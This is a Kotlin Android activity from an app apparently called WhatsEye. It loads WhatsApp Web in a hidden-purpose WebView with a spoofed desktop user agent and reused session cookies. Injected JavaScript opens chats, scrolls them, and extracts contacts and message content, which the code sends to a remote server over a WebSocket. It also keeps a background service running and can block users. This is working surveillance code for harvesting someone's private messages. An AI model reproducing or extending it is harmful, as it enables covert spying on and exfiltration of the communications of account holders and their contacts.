package com.example.whatseye

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.example.whatseye.api.managers.JwtTokenManager
import com.example.whatseye.api.ws.WebSocketClientGeneral
import com.example.whatseye.api.ws.WebSocketGeneralManager
import com.example.whatseye.dataType.JavaScriptCode
import com.example.whatseye.services.AlwaysRunningService
import org.json.JSONObject

class LoggedInActivity : AppCompatActivity() {
    @SuppressLint("StaticFieldLeak")
    companion object {
        var text: Any = ""
        private var instance: LoggedInActivity? = null

        fun getInstance(): LoggedInActivity? {
            return instance
        }
    }

    private val TAG = "AlwaysRunningService"
    private lateinit var webView: WebView
    private lateinit var contentTextView: TextView
    private lateinit var btnGetContact: Button
    private val MAX_RETRIES = 100
    private val POLL_DELAY_MS = 1800L
    private var retryCount = 0
    private var checkLoginCount = 0
    private var isLoggedIn = false
    private val handler = Handler(Looper.getMainLooper())
    private val checkLoginRunnable = Runnable { checkLogin() }
    private var webSocketManager: WebSocketClientGeneral? = null



    val text:String = ""
    private var clicked = false


    @SuppressLint("NewApi")
    override fun onCreate(savedInstanceState: Bundle?) {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
//            WebView.setDataDirectorySuffix("WhatsApp2") // webview2 for the second one
//        }
        super.onCreate(savedInstanceState)
        setContentView(R.layout.logged_in_activity)
        //setDataDirectorySuffix("whatsapp1")
        instance = this
        if(JwtTokenManager(this).getIsLogin()) {
            webSocketManager = WebSocketGeneralManager.getInstance(this)
        }


        initializeViews()
        setupWebView()
        loadWhatsAppWeb()
//        btnGetContact.setOnClickListener {
//            selectRoom("0PFE")
//
//
//        }

    }

    private fun initializeViews() {
        webView = findViewById(R.id.webview)
        contentTextView = findViewById(R.id.profileTextView)
        btnGetContact = findViewById(R.id.btngetContact)
    }



    @SuppressLint("SetJavaScriptEnabled", "NewApi")
    private fun setupWebView() {
        with(webView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            setSupportMultipleWindows(false)

            cacheMode = WebSettings.LOAD_CACHE_ELSE_NETWORK
            userAgentString = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
       // webView.addJavascriptInterface(WebAppInterface(), "Androidf")

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                restoreCookies()
                retryCount = 0
                webView.evaluateJavascript("""(()=>{document.body.style.zoom = "70%";})();""",null)
                checkLogin()
            }



        }
    }

    private fun loadWhatsAppWeb() {
        webView.loadUrl("https://web.whatsapp.com")
        ensureCookiesAccepted()
        restoreCookies()
    }

    @SuppressLint("ObsoleteSdkInt")
    private fun startPollingForElement() {
        val jsCheckElement = """
                    (function() {
                        return document.querySelector('[role="img"]') !== null;
                    })();
                """.trimIndent()

        webView.evaluateJavascript(jsCheckElement) { result ->
            val isElementLoaded = result?.toBoolean() ?: false
            if (isElementLoaded) {
                JwtTokenManager(this@LoggedInActivity).setIsLoginWhatsApp(false)
                val intent = Intent(this@LoggedInActivity, MainActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                startActivity(intent)
                finish()
            } else if (retryCount < 20) {
                retryCount++
                Handler(Looper.getMainLooper()).postDelayed({
                    startPollingForElement()
                }, POLL_DELAY_MS)
            } else {
                webView.reload()
            }
        }
    }

    @SuppressLint("ObsoleteSdkInt")
    private fun checkLogin() {
        val jsCode = """
            (function() {
                var element = document.querySelector('div[aria-rowcount]');
                return (element !== null);
            })();
        """.trimIndent()

        webView.evaluateJavascript(jsCode) { data ->
            if (data.toBoolean()) {
                handler.removeCallbacks(checkLoginRunnable)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
                }
                isLoggedIn = true
            } else {
                if (checkLoginCount < MAX_RETRIES) {
                    checkLoginCount++
                    handler.postDelayed(checkLoginRunnable, POLL_DELAY_MS)
                } else {

                    startPollingForElement();
                    Log.e("WebView", "Login check max retries reached")
                }
            }
        }
    }

    private fun checkCurrentChats() {
        webView.evaluateJavascript("""(()=>{
            const a = document.querySelector("span[data-icon='back']");
            if (a) a.click();
        })();""".trimIndent()){webView.evaluateJavascript(JavaScriptCode.CURRENT_CHATS, null) }
    }
    private fun loadCurrentChat(){
        webView.evaluateJavascript(
            """( ()=>{  const data = localStorage.getItem("CURRENT_CHATS");
                        return data;
            })();""".trimIndent()
        ) { html -> contentTextView.text = html }
    }

    private fun loadContact() {
        retryCount=0
        webView.evaluateJavascript(
            """(()=>{
            const a = document.querySelector("span[data-icon='new-chat-outline']");
            if (a) a.click();
        })();""".trimIndent()
        ) { webView.evaluateJavascript(JavaScriptCode.CONTACT) {
            checkContact()
        }}
    }

    private fun checkContact(){
        webView.evaluateJavascript(
            """( ()=>{ return localStorage.getItem("CONTACT")!==null;})();""".trimIndent()
        ){data->
            if (data.toBoolean()) {
                webView.evaluateJavascript(
                    """( ()=>{          const data = localStorage.getItem("CONTACT");
                                        localStorage.removeItem("CONTACT");
                                return data;
                    })();""".trimIndent()
                ) { html -> webSocketManager?.sendContact(html) }
            }else if (retryCount < 60) {
                retryCount++
                Handler(Looper.getMainLooper()).postDelayed({
                    checkContact()
                }, POLL_DELAY_MS)
            } else {
                webView.reload()
            }
        }
    }



    private var selectRoomRetryCount = 0
    private var scrollContentRetryCount = 0

    fun selectRoom(name: String) {
        selectRoomRetryCount = 0
        webView.evaluateJavascript(
            """(() => {  localStorage.removeItem("ROOM_SELECTED") 
                localStorage.removeItem("DONE_LOADING_CHAT") })();""".trimIndent(),null)
        val escapedName = JSONObject.quote(name)
        Log.d(TAG, "Selecting room: $name (escaped: $escapedName)")
        webView.evaluateJavascript(
            """${JavaScriptCode.SELECT_ROOM}($escapedName);"""
        ) {
            Log.d(TAG, "Room selection JavaScript executed, starting selectRoomFinished()")
            selectRoomFinished()
        }
    }

    private fun selectRoomFinished() {
        webView.evaluateJavascript(
            """(() => { return localStorage.getItem("ROOM_SELECTED") !== null; })();""".trimIndent()
        ) { data ->
            val isLoaded = data?.toBooleanStrictOrNull() ?: false
            if (isLoaded) {
                handler.removeCallbacks(checkLoginRunnable)
                handler.postDelayed({chatContent()}, 4000)
            } else if (selectRoomRetryCount < 60) {
                Log.d(TAG, "Room not selected yet, retrying (${selectRoomRetryCount + 1}/60)")
                selectRoomRetryCount++
                handler.postDelayed({ selectRoomFinished() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Timeout reached: failed to select room, reloading WebView")
                webView.reload()
            }
        }
    }

    private fun scrollContent() {
        scrollContentRetryCount = 0
        Log.d(TAG, "Initiating content scroll")
        webView.evaluateJavascript(JavaScriptCode.CHAT_ROOM_SCROLLER) {
            Log.d(TAG, "Scroll JavaScript executed, checking if content loaded")
            scrollContentFinished()
        }
    }

    private fun scrollContentFinished() {
        webView.evaluateJavascript(
            """(() => { return localStorage.getItem("DONE_LOADING_CHAT") !== null; })();""".trimIndent()
        ) { data ->
            val isLoaded = data?.toBooleanStrictOrNull() ?: false
            if (isLoaded) {
                handler.removeCallbacks(checkLoginRunnable)
                chatContent()
            } else if (scrollContentRetryCount < 60) {
                Log.d(TAG, "Chat not loaded yet, retrying (${scrollContentRetryCount + 1}/60)")
                scrollContentRetryCount++
                handler.postDelayed({ scrollContentFinished() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Timeout reached: failed to load chat, reloading WebView")
                webView.reload()
            }
        }
    }

    fun chatContent() {
        Log.d(TAG, "Chat content is fully loaded, extracting chat")
        webView.evaluateJavascript(JavaScriptCode.GET_CHAT) { html ->
            if (!html.isNullOrEmpty()) {
                Log.d(TAG, "Extracted chat data, sending via WebSocket")
                webSocketManager?.sendChat(html)
                handler.removeCallbacks(checkLoginRunnable)
                Log.d(TAG, "Chat sent successfully")
            } else {
                Log.w(TAG, "Chat data was empty or null")
            }
        }
    }

    fun getChatRoom(name: String) {
        Log.d("selectRoom", "selectRoom")
        selectRoom(name)
    }






    private fun blockUser(){
        webView.evaluateJavascript("""(()=>{return ${JavaScriptCode.BLOCK_USER}('lol') } )();"""){html ->
            contentTextView.text = html

        }
    }

    private fun ensureCookiesAccepted() {
        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
    }

    private fun restoreCookies() {
        val sharedPreferences = getSharedPreferences("whatsapp_prefs", MODE_PRIVATE)
        val savedCookies = sharedPreferences.getString("whatsapp_cookies", null)
        if (!savedCookies.isNullOrEmpty()) {
            val cookieManager = CookieManager.getInstance()
            cookieManager.setCookie("https://web.whatsapp.com", savedCookies)
        }
    }
}